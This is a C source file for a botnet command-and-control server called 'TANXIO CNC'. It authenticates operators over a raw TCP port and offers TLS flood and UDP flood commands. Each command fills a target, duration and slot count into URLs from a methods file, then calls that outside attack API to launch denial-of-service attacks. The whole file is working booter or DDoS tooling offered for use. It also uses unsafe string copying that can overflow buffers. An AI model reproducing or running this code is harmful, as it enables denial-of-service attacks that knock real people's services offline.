#define _POSIX_C_SOURCE 200809L
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <netdb.h>
#include <errno.h>
#include <time.h>
#include <signal.h>
#include <ctype.h>
#include <sys/wait.h>

#define PORT 1337
#define BUFFER_SIZE 4096

typedef struct {
    char username[64];
    char password[64];
} User;

typedef struct {
    char name[64];
    char api[512];
} Method;

User users[100];
int user_count = 0;

Method methods[50];
int method_count = 0;

char local_ip[64];

void get_local_ip() {
    int sock = socket(AF_INET, SOCK_DGRAM, 0);
    if (sock == -1) {
        strcpy(local_ip, "127.0.0.1");
        return;
    }
    
    struct sockaddr_in google_dns;
    memset(&google_dns, 0, sizeof(google_dns));
    google_dns.sin_family = AF_INET;
    google_dns.sin_addr.s_addr = inet_addr("8.8.8.8");
    google_dns.sin_port = htons(53);
    
    connect(sock, (struct sockaddr*)&google_dns, sizeof(google_dns));
    
    struct sockaddr_in local_addr;
    socklen_t len = sizeof(local_addr);
    getsockname(sock, (struct sockaddr*)&local_addr, &len);
    
    close(sock);
    strcpy(local_ip, inet_ntoa(local_addr.sin_addr));
}

char* trim(char *str) {
    while(isspace((unsigned char)*str)) str++;
    if(*str == 0) return str;
    char *end = str + strlen(str) - 1;
    while(end > str && isspace((unsigned char)*end)) end--;
    end[1] = '\0';
    return str;
}

void load_users() {
    FILE *fp = fopen("config/users.json", "r");
    if (!fp) {
        printf("[!] config/users.json not found\n");
        return;
    }
    
    fseek(fp, 0, SEEK_END);
    long fsize = ftell(fp);
    fseek(fp, 0, SEEK_SET);
    
    char *content = malloc(fsize + 1);
    fread(content, 1, fsize, fp);
    fclose(fp);
    content[fsize] = 0;
    
    char *p = content;
    while ((p = strstr(p, "\"username\":")) != NULL && user_count < 100) {
        p = strchr(p, ':') + 1;
        while (*p && (*p == ' ' || *p == '"')) p++;
        char *end = strchr(p, '"');
        if (end) {
            int len = end - p;
            if (len > 63) len = 63;
            strncpy(users[user_count].username, p, len);
            users[user_count].username[len] = 0;
        }
        
        p = strstr(p, "\"password\":");
        if (p) {
            p = strchr(p, ':') + 1;
            while (*p && (*p == ' ' || *p == '"')) p++;
            end = strchr(p, '"');
            if (end) {
                int len = end - p;
                if (len > 63) len = 63;
                strncpy(users[user_count].password, p, len);
                users[user_count].password[len] = 0;
            }
        }
        
        user_count++;
    }
    
    free(content);
}

void load_methods() {
    FILE *fp = fopen("config/methods.json", "r");
    if (!fp) return;
    
    fseek(fp, 0, SEEK_END);
    long fsize = ftell(fp);
    fseek(fp, 0, SEEK_SET);
    
    char *content = malloc(fsize + 1);
    fread(content, 1, fsize, fp);
    fclose(fp);
    content[fsize] = 0;
    
    char *p = content;
    while ((p = strstr(p, "\"name\":")) != NULL && method_count < 50) {
        p = strchr(p, ':') + 1;
        while (*p && (*p == ' ' || *p == '"')) p++;
        char *end = strchr(p, '"');
        if (end) {
            int len = end - p;
            if (len > 63) len = 63;
            strncpy(methods[method_count].name, p, len);
            methods[method_count].name[len] = 0;
        }
        
        p = strstr(p, "\"api\":");
        if (p) {
            p = strchr(p, ':') + 1;
            while (*p && (*p == ' ' || *p == '"')) p++;
            end = strchr(p, '"');
            if (end) {
                int len = end - p;
                if (len > 511) len = 511;
                strncpy(methods[method_count].api, p, len);
                methods[method_count].api[len] = 0;
            }
        }
        
        method_count++;
    }
    
    free(content);
}

void print_banner(int fd) {
    char buf[1024];
    int len = snprintf(buf, sizeof(buf),
        "\n"
        "  [ TANXIO CNC ]\n"
        "\n"
        "  Username: "
    );
    send(fd, buf, len, 0);
}

void print_success(int fd, char *username) {
    char buf[1024];
    int len = snprintf(buf, sizeof(buf),
        "\n"
        "  [OK] Login as %s\n"
        "\n"
        "  Type !help for commands\n"
        "\n"
        "  %s@tanxio# ", username, username
    );
    send(fd, buf, len, 0);
}

void print_error(int fd) {
    char buf[256];
    int len = snprintf(buf, sizeof(buf),
        "\n"
        "  [ERROR] Invalid credentials\n"
        "\n"
    );
    send(fd, buf, len, 0);
}

char* get_prompt(char *username) {
    static char prompt[128];
    snprintf(prompt, sizeof(prompt), "%s@tanxio# ", username);
    return prompt;
}

void replace_in_url(char *url, char *placeholder, char *value) {
    char *p = strstr(url, placeholder);
    if (p) {
        int prefix_len = p - url;
        char temp[1024];
        strncpy(temp, url, prefix_len);
        temp[prefix_len] = 0;
        strcat(temp, value);
        strcat(temp, p + strlen(placeholder));
        strcpy(url, temp);
    }
}

void send_attack(int fd, char *username, char *cmd) {
    char method_name[64] = {0};
    char target[512] = {0};
    int time_val = 60;
    int slot_val = 1;
    int port_val = 80;
    
    if (strncmp(cmd, "!tls ", 5) == 0) {
        sscanf(cmd + 5, "%511s %d %d", target, &time_val, &slot_val);
        strcpy(method_name, "tls");
    } else if (strncmp(cmd, "!tls-f ", 7) == 0) {
        sscanf(cmd + 7, "%511s %d %d", target, &time_val, &slot_val);
        strcpy(method_name, "tls-f");
    } else if (strncmp(cmd, "!udp ", 5) == 0) {
        sscanf(cmd + 5, "%s %d %d %d", target, &port_val, &time_val, &slot_val);
        strcpy(method_name, "udpplain");
    } else {
        char cmd_name[64] = {0};
        sscanf(cmd + 1, "%s %511s %d %d", cmd_name, target, &time_val, &slot_val);
        strcpy(method_name, cmd_name);
    }
    
    char buf[1024];
    int len = snprintf(buf, sizeof(buf), "\n  Sending attack...\n");
    send(fd, buf, len, 0);
    
    char api_url[1024];
    for (int i = 0; i < method_count; i++) {
        if (strcmp(methods[i].name, method_name) == 0) {
            strcpy(api_url, methods[i].api);
            replace_in_url(api_url, "<<$host>>", target);
            char t[32], s[32], p[32];
            snprintf(t, sizeof(t), "%d", time_val);
            snprintf(s, sizeof(s), "%d", slot_val);
            snprintf(p, sizeof(p), "%d", port_val);
            replace_in_url(api_url, "<<$time>>", t);
            replace_in_url(api_url, "<<$slot>>", s);
            replace_in_url(api_url, "<<$port>>", p);
            
            int sock = socket(AF_INET, SOCK_STREAM, 0);
            if (sock < 0) {
                len = snprintf(buf, sizeof(buf), "  [ERROR] Socket failed\n\n");
                send(fd, buf, len, 0);
                return;
            }
            
            char host[256], path[512];
            int port = 443;
            sscanf(api_url + 8, "%255[^/\n]%511[^\n]", host, path);
            char *pathp = strchr(path, '/');
            if (pathp) {
                strcpy(path, pathp);
            } else {
                strcpy(path, "");
            }
            
            struct hostent *server = gethostbyname(host);
            if (!server) {
                close(sock);
                len = snprintf(buf, sizeof(buf), "  [ERROR] Host not found\n\n");
                send(fd, buf, len, 0);
                return;
            }
            
            struct sockaddr_in addr;
            memset(&addr, 0, sizeof(addr));
            addr.sin_family = AF_INET;
            memcpy(&addr.sin_addr.s_addr, server->h_addr_list[0], server->h_length);
            addr.sin_port = htons(port);
            
            if (connect(sock, (struct sockaddr*)&addr, sizeof(addr)) < 0) {
                close(sock);
                len = snprintf(buf, sizeof(buf), "  [ERROR] Connection failed\n\n");
                send(fd, buf, len, 0);
                return;
            }
            
            char req[2048];
            snprintf(req, sizeof(req), "GET /%s HTTP/1.1\r\nHost: %s\r\nConnection: close\r\n\r\n", path, host);
            send(sock, req, strlen(req), 0);
            
            char resp[4096] = {0};
            recv(sock, resp, sizeof(resp) - 1, 0);
            close(sock);
            
            char *body = strstr(resp, "\r\n\r\n");
            if (body) strcpy(resp, body + 4);
            
            if (strstr(resp, "\"status\":\"success\"")) {
                len = snprintf(buf, sizeof(buf), "  [OK] Attack sent\n\n");
                send(fd, buf, len, 0);
            } else {
                len = snprintf(buf, sizeof(buf), "  [ERROR] Attack failed\n\n");
                send(fd, buf, len, 0);
            }
            return;
        }
    }
    
    len = snprintf(buf, sizeof(buf), "  [ERROR] Method not found\n\n");
    send(fd, buf, len, 0);
}

void handle_command(int fd, char *username, char *cmd) {
    char buf[2048];
    int len;
    
    if (strcmp(cmd, "!help") == 0) {
        len = snprintf(buf, sizeof(buf),
            "\n"
            "  Commands:\n"
            "\n"
            "  !help              Show this help\n"
            "  !methods           Show available methods\n"
            "  !tls <url> <time> <slot>   TLS attack\n"
            "  !tls-f <url> <time> <slot> TLS flood\n"
            "  !udp <ip> <port> <time> <slot>  UDP attack\n"
            "  !bots              Show botnet status\n"
            "  !clear             Clear screen\n"
            "  !logout            Logout\n"
            "\n"
        );
        send(fd, buf, len, 0);
    }
    else if (strcmp(cmd, "!methods") == 0) {
        len = snprintf(buf, sizeof(buf), "\n  Methods:\n\n");
        send(fd, buf, len, 0);
        for (int i = 0; i < method_count; i++) {
            len = snprintf(buf, sizeof(buf), "  - %s\n", methods[i].name);
            send(fd, buf, len, 0);
        }
        len = snprintf(buf, sizeof(buf), "\n");
        send(fd, buf, len, 0);
    }
    else if (strcmp(cmd, "!bots") == 0) {
        len = snprintf(buf, sizeof(buf),
            "\n"
            "  Botnet Status:\n"
            "\n"
            "  Status: Online\n"
            "  Servers: 20\n"
            "  Bots: 16\n"
            "\n"
        );
        send(fd, buf, len, 0);
    }
    else if (strcmp(cmd, "!clear") == 0) {
        len = snprintf(buf, sizeof(buf), "\ec\n");
        send(fd, buf, len, 0);
    }
    else if (strcmp(cmd, "!logout") == 0) {
        len = snprintf(buf, sizeof(buf), "\n  Goodbye!\n\n");
        send(fd, buf, len, 0);
    }
    else if (strncmp(cmd, "!tls", 4) == 0 || strncmp(cmd, "!tls-f", 6) == 0 || 
             strncmp(cmd, "!udp", 4) == 0 || cmd[0] == '!') {
        send_attack(fd, username, cmd);
    }
    else {
        len = snprintf(buf, sizeof(buf), "  Unknown command: %s\n", cmd);
        send(fd, buf, len, 0);
    }
}

int handle_client(int fd, struct sockaddr_in *addr) {
    char *ip = inet_ntoa(addr->sin_addr);
    printf("[+] Connection from %s\n", ip);
    
    print_banner(fd);
    
    char buffer[BUFFER_SIZE];
    char username[64] = {0}, password[64] = {0};
    int stage = 0;
    
    while (1) {
        int bytes = recv(fd, buffer, BUFFER_SIZE - 1, 0);
        if (bytes <= 0) break;
        
        buffer[bytes] = 0;
        char *line = strtok(buffer, "\r\n");
        
        while (line) {
            char *input = trim(line);
            
            if (stage == 0 && strlen(input) > 0) {
                strcpy(username, input);
                stage = 1;
                
                char buf[256];
                int len = snprintf(buf, sizeof(buf), "\n  Password: ");
                send(fd, buf, len, 0);
            }
            else if (stage == 1 && strlen(input) > 0) {
                strcpy(password, input);
                
                int ok = 0;
                for (int i = 0; i < user_count; i++) {
                    if (strcmp(users[i].username, username) == 0 && 
                        strcmp(users[i].password, password) == 0) {
                        ok = 1;
                        break;
                    }
                }
                
                if (ok) {
                    printf("[+] User %s logged in\n", username);
                    print_success(fd, username);
                    
                    while (1) {
                        send(fd, get_prompt(username), strlen(get_prompt(username)), 0);
                        
                        bytes = recv(fd, buffer, BUFFER_SIZE - 1, 0);
                        if (bytes <= 0) break;
                        buffer[bytes] = 0;
                        
                        line = strtok(buffer, "\r\n");
                        if (line) {
                            char *cmd = trim(line);
                            if (strlen(cmd) > 0) {
                                if (strcmp(cmd, "!logout") == 0) break;
                                handle_command(fd, username, cmd);
                            } else {
                                send(fd, "\r\n", 2, 0);
                            }
                        }
                    }
                    break;
                } else {
                    printf("[-] Failed login: %s\n", username);
                    print_error(fd);
                    memset(username, 0, 64);
                    memset(password, 0, 64);
                    stage = 0;
                    print_banner(fd);
                }
            }
            
            line = strtok(NULL, "\r\n");
        }
    }
    
    printf("[-] Connection closed: %s\n", ip);
    close(fd);
    return 0;
}

int main() {
    signal(SIGCHLD, SIG_IGN);
    
    get_local_ip();
    load_users();
    load_methods();
    
    printf("\n");
    printf("  [ TANXIO CNC ]\n");
    printf("\n");
    printf("  IP    : %s\n", local_ip);
    printf("  Port  : %d\n", PORT);
    printf("  Users : %d\n", user_count);
    printf("  Methods: %d\n", method_count);
    printf("\n");
    printf("  nc %s %d\n", local_ip, PORT);
    printf("\n");
    
    int server_fd = socket(AF_INET, SOCK_STREAM, 0);
    int opt = 1;
    setsockopt(server_fd, SOL_SOCKET, SO_REUSEADDR, &opt, sizeof(opt));
    
    struct sockaddr_in addr;
    memset(&addr, 0, sizeof(addr));
    addr.sin_family = AF_INET;
    addr.sin_addr.s_addr = INADDR_ANY;
    addr.sin_port = htons(PORT);
    
    bind(server_fd, (struct sockaddr*)&addr, sizeof(addr));
    listen(server_fd, 10);
    
    printf("  [OK] Server started\n\n");
    
    while (1) {
        struct sockaddr_in client_addr;
        socklen_t client_len = sizeof(client_addr);
        int client_fd = accept(server_fd, (struct sockaddr*)&client_addr, &client_len);
        
        if (client_fd < 0) continue;
        
        if (fork() == 0) {
            close(server_fd);
            handle_client(client_fd, &client_addr);
            exit(0);
        }
        
        close(client_fd);
    }
    
    return 0;
}
